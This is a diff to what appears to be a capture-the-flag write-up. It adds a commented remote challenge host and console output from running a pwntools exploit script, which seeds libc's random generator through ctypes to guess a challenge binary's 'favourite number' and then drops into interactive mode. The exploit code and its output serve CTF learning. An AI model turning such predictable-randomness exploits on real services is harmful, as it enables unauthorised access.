@@ -130,7 +130,8 @@ from ctypes import CDLL
 
 # Target = remote('challenge.404ctf.fr', 31720)
 target = process('./distrib/vuln') #You have got to change your own path of the binary.
-# target = remote('')
+# target = remote('fun.chall.seetf.sg', 50001)
+
 # Including the libc library.
 libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
 
@@ -151,5 +152,18 @@ target.sendline(str(generated_Number).encode())
 target.interactive()
 target.close()
 ```` 
+
+````console
+┌──(ironbyte㉿IronByte)-[/mnt/c/Users/IR0NYTE/Desktop/ctf]
+└─$ python3 exploit.py
+[+] Starting local process './distrib/vuln': pid 607
+[*] Switching to interactive mode
+Guess my favourite number!
+Yes! You know me so well!
+cat: flag: No such file or directory
+[*] Got EOF while reading in interactive
+$
+````
+feel free to add your own flag if you are testing locally cuz i'm too lazy to add one :).
 
 
